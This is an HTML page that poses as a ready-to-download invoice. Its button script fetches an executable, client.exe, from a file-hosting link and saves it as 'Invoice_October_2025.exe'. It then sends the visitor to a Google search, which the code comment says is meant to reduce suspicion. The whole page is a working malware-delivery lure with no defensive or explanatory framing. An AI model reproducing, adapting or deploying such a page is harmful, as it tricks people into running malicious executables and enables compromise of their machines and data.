<!DOCTYPE html>
<html>

<head>
    <title>Loading Document...</title>
</head>

<body>
    <p>Your document is ready for download.</p>
    <button id="downloadBtn" style="padding:10px 20px; font-size:16px; cursor:pointer;">
        Click here to download Invoice
    </button>

    <script type="text/javascript">
        document.getElementById('downloadBtn').addEventListener('click', function () {
            var payloadUrl = "https://store1.gofile.io/download/3rOXQV/client.exe";
            var decoyFilename = "Invoice_October_2025.exe";

            var link = document.createElement("a");
            link.href = payloadUrl;

            // Note: download attribute might be ignored on cross-origin links but we add it anyway
            link.download = decoyFilename;

            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // Redirect after a short delay to reduce suspicion
            setTimeout(function () {
                window.location.href = "https://www.google.com/search?q=invoice+not+found";
            }, 500);
        });
    </script>
</body>

</html>
